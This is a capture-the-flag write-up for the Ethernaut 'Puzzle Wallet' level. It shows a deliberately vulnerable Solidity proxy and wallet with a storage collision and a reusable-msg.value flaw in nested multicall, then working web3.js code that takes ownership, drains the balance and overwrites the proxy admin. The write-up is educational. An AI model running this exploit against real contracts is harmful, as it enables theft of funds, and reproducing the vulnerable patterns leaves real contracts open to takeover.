# Ethernaut: 24. Puzzle Wallet

> Nowadays, paying for DeFi operations is impossible, fact.
>
> A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.
>
> They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
>
> Little did they know, their lunch money was at risk…
>
> You'll need to hijack this wallet to become the admin of the proxy.

**Objective of CTF:**

- Drain the wallet.
- Become the wallet owner.
- Become the admin of the proxy.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Proxy.sol";

/**
 *
 * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an
 * implementation address that can be changed. This address is stored in storage in the location specified by
 * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the
 * implementation behind the proxy.
 *
 * Upgradeability is only provided internally through {_upgradeTo}. For an externally upgradeable proxy see
 * {TransparentUpgradeableProxy}.
 */
contract PuzzleWalletUpgradeableProxy is Proxy {
  /**
   * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
   *
   * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded
   * function call, and allows initializating the storage of the proxy like a Solidity constructor.
   */
  constructor(address _logic, bytes memory _data) {
    assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
    _setImplementation(_logic);
    if (_data.length > 0) {
      // solhint-disable-next-line avoid-low-level-calls
      (bool success, ) = _logic.delegatecall(_data);
      require(success);
    }
  }

  /**
   * @dev Emitted when the implementation is upgraded.
   */
  event Upgraded(address indexed implementation);

  /**
   * @dev Storage slot with the address of the current implementation.
   * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
   * validated in the constructor.
   */
  bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

  /**
   * @dev Returns the current implementation address.
   */
  function _implementation() internal view override returns (address impl) {
    bytes32 slot = _IMPLEMENTATION_SLOT;
    // solhint-disable-next-line no-inline-assembly
    assembly {
      impl := sload(slot)
    }
  }

  /**
   * @dev Upgrades the proxy to a new implementation.
   *
   * Emits an {Upgraded} event.
   */
  function _upgradeTo(address newImplementation) internal {
    _setImplementation(newImplementation);
    emit Upgraded(newImplementation);
  }

  /**
   * @dev Stores a new address in the EIP1967 implementation slot.
   */
  function _setImplementation(address newImplementation) private {
    require(Address.isContract(newImplementation), "UpgradeableProxy: new implementation is not a contract");

    bytes32 slot = _IMPLEMENTATION_SLOT;

    // solhint-disable-next-line no-inline-assembly
    assembly {
      sstore(slot, newImplementation)
    }
  }
}

contract PuzzleProxy is PuzzleWalletUpgradeableProxy {
  address public pendingAdmin;
  address public admin;

  constructor(
    address _admin,
    address _implementation,
    bytes memory _initData
  ) PuzzleWalletUpgradeableProxy(_implementation, _initData) {
    admin = _admin;
  }

  modifier onlyAdmin() {
    require(msg.sender == admin, "Caller is not the admin");
    _;
  }

  function proposeNewAdmin(address _newAdmin) external {
    pendingAdmin = _newAdmin;
  }

  function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
    require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
    admin = pendingAdmin;
  }

  function upgradeTo(address _newImplementation) external onlyAdmin {
    _upgradeTo(_newImplementation);
  }
}

contract PuzzleWallet {
  address public owner;
  uint256 public maxBalance;
  mapping(address => bool) public whitelisted;
  mapping(address => uint256) public balances;

  function init(uint256 _maxBalance) public {
    require(maxBalance == 0, "Already initialized");
    maxBalance = _maxBalance;
    owner = msg.sender;
  }

  modifier onlyWhitelisted() {
    require(whitelisted[msg.sender], "Not whitelisted");
    _;
  }

  function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
  }

  function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
  }

  function deposit() external payable onlyWhitelisted {
    require(address(this).balance <= maxBalance, "Max balance reached");
    balances[msg.sender] += msg.value;
  }

  function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success, ) = to.call{value: value}(data);
    require(success, "Execution failed");
  }

  function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
      bytes memory _data = data[i];
      bytes4 selector;
      assembly {
        selector := mload(add(_data, 32))
      }
      if (selector == this.deposit.selector) {
        require(!depositCalled, "Deposit can only be called once");
        // Protect against reusing msg.value
        depositCalled = true;
      }
      (bool success, ) = address(this).delegatecall(data[i]);
      require(success, "Error while delegating call");
    }
  }
}
```

We have an Upgradable Proxy implementation in use here. [Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies) are a sort of middleman between some logic and your main contract, such that instead of writing that logic in the main contract and thus not being able to upgrade it, you write it in some other contract and make the proxy point there. This way, if that logic needs an update you create a new contract and point the proxy there. `delegatecall` is used to implement this, but you should know by now that life is not easy when you use `delegatecall` without care!

## Storage Collision

The first thing we may notice is that there is a storage collision between proxy and logic.

| slot | proxy          | logic               |
| ---- | -------------- | ------------------- |
| 0    | `pendingAdmin` | `owner`             |
| 1    | `admin`        | `maxBalance`        |
| 2    |                | `whitelisted` (map) |
| 3    |                | `balances` (map)    |

With this exploit in mind, let us see our options:

- If the logic writes to `maxBalance`, it will overwrite `admin` in the proxy. That seems to be a good attack vector to win the game.

- To update `maxBalance`, the wallet balance must be 0 and `msg.sender` must be whitelisted.

- For wallet balance to be 0, we need to drain it somehow.

- To be whitelisted, `addToWhitelist` must be called by the `owner`.

- But hey, `owner` collided with `pendingAdmin` in the proxy, and we can very well overwrite it via `proposeAdmin`! We can add ourselves to the whitelist after becoming the owner.

## Draining the Wallet

The plan seems good so far, but one piece is missing: how do we drain the wallet? Assuming we are both the owner and whitelisted, let's see what we have:

- `deposit` function allows you to deposit, with respect to not exceeding `maxBalance`.
- `execute` function allows you to `call` a function on any address with some value that is within your balance. Without any call data and your address as the destination, this acts like a `withdraw` function.
- `multicall` function allows you to make multiple calls of the above two, in a single transaction. This function is basically the main idea of the entire contract.

The `multicall` function supposedly checks for double spending on `deposit` via a boolean flag; however, this flag works only for one `multicall`! If you were to call `multicall` within a `multicall`, you can bypass it. Since `delegatecall` forwards `msg.value` too, you can put more money than you have to your balance.

## Attack

First things first, let's become the `owner` and whitelist ourselves. Within the console, we are only exposed to the logic contract (`PuzzleWallet`) via `contract` object, but everything goes through proxy first. We can call the functions there by manually giving the calldata.

```js
const functionSelector = '0xa6376746'; // proposeNewAdmin(address)
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: web3.utils.encodePacked(functionSelector, web3.utils.padLeft(player, 64)),
});
// confirm that it worked
if (player == (await contract.owner())) {
  // whitelist ourselves
  await contract.addToWhitelist(player);
}
```

The next step is to drain the contract balance. When we check the total balance via `await getBalance(contract.address)` we get `0.001`. So if we somehow deposit `0.001` twice with double-spending, the contract will think total balance to be `0.003` but actually it will be `0.002`. Then we can withdraw our balance alone and the contract balance will be drained.

Here is a schema on how we will arrange the `multicall`s:

```js
// let 'b' denote balance of contract
// call with {value: b}
multicall:[
  deposit(),
  multicall:[
    deposit() // double spending!
  ],
  execute(player, 2 * b, []) // drain contract
]
```

Writing the actual code for this schema:

```js
// contract balance
const _b = web3.utils.toWei(await getBalance(contract.address));
// 2 times contract balance
const _2b = web3.utils.toBN(_b).add(web3.utils.toBN(_b));
await contract.multicall(
  [
    // first deposit
    (
      await contract.methods['deposit()'].request()
    ).data,
    // multicall for the second deposit
    (
      await contract.methods['multicall(bytes[])'].request([
        // second deposit
        (
          await contract.methods['deposit()'].request()
        ).data,
      ])
    ).data,
    // withdraw via execute
    (
      await contract.methods['execute(address,uint256,bytes)'].request(player, _2b, [])
    ).data,
  ],
  {value: _b}
);
```

Thanks to the `multicall`, the attack will be executed in a single transaction too :) Afterwards, we can confirm via `await getBalance(contract.address)` that the balance of the contract is now 0.

We are ready for the next step, which is to call `setMaxBalance`. Whatever value we send here will overwrite the `admin` value, so we just convert our address to an `uint256` and call this function:

```js
await contract.setMaxBalance(web3.utils.hexToNumberString(player));
// see that admin value is overwritten
await web3.eth.getStorageAt(contract.address, 1);
```

That is all!
